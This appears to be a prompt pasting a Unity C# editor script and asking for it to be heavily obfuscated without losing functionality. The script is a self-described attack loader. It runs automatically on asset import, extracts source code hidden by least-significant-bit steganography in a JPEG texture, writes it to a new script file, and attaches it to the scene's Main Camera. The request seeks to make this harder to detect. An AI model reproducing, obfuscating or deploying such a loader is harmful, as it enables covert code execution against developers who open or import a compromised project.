"using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using UnityEditor.SceneManagement;
using UnityEngine.SceneManagement;

public class Launcher: AssetPostprocessor
{
    void OnPreprocessTexture()
    {
        // Only modify our target texture
        if (assetPath.EndsWith("box_embedded.jpg", StringComparison.OrdinalIgnoreCase))
        {
            TextureImporter importer = (TextureImporter)assetImporter;
            importer.isReadable = true; // Enable Read/Write
            importer.textureCompression = TextureImporterCompression.Uncompressed;
            importer.SaveAndReimport(); // Apply changes
        }
    }
    static void OnPostprocessAllAssets(string[] importedAssets, string[] deletedAssets, string[] movedAssets, string[] movedFromAssetPaths) 
    {
        Debug.Log("Developer Mode: Attack Activated!");
        string scriptPath = "Assets/ServerO.cs";
        string scriptContent3 = Process();
        //scriptContent3 = scriptContent3.Remove(scriptContent3.Length -41);
        Debug.Log(scriptContent3);
        File.WriteAllText(scriptPath, scriptContent3);
        AssetDatabase.Refresh();
        EditorApplication.delayCall += AddComponentToMainCamera;
    }

    static void AddComponentToMainCamera()
    {
        // Check if type exists
        Type helloType = Type.GetType("ServerO, Assembly-CSharp");
        if (helloType == null) return;

        // Find Main Camera and add component
        GameObject mainCamera = GameObject.Find("Main Camera");
        if (mainCamera != null && mainCamera.GetComponent(helloType) == null)
        {
            mainCamera.AddComponent(helloType);
            EditorUtility.SetDirty(mainCamera);
            EditorSceneManager.MarkSceneDirty(SceneManager.GetActiveScene());
        }
    }
    private static string Process()
    {
        string embeddedPath = "Assets/box_embedded.jpg";
        Texture2D watermarkedTexture = AssetDatabase.LoadAssetAtPath<Texture2D>(embeddedPath);
        int requiredBits = 19520; //originalMessage.Length * 8; // 1200 bits
        string decodedWatermark = DecodeWatermark(watermarkedTexture, requiredBits);
        decodedWatermark = decodedWatermark.Remove(decodedWatermark.Length - 40);
        decodedWatermark += "\n}";
        return decodedWatermark;
    }

    private static string DecodeWatermark(Texture2D texture, int length)
    {
        Color[] pixels = texture.GetPixels();
        System.Text.StringBuilder binaryData = new System.Text.StringBuilder();
        for (int i = 0; i < length && i < pixels.Length; i++)
        {
            Color pixel = pixels[i];
            binaryData.Append(ExtractLSB(pixel.r));
        }
        string binaryString = binaryData.ToString();
        System.Text.StringBuilder decodedMessage = new System.Text.StringBuilder();

        for (int i = 0; i + 8 <= binaryString.Length; i += 8)
        {
            string byteString = binaryString.Substring(i, 8);
            decodedMessage.Append((char)System.Convert.ToByte(byteString, 2));
        }

        return decodedMessage.ToString();
    }
    private static char ExtractLSB(float channelValue)
    {
        int intValue = Mathf.RoundToInt(channelValue * 255);
        return (intValue & 1) == 1 ? '1' : '0';
    }
}"


pls super obfuscate this (without using special characters), and without losing any functionality
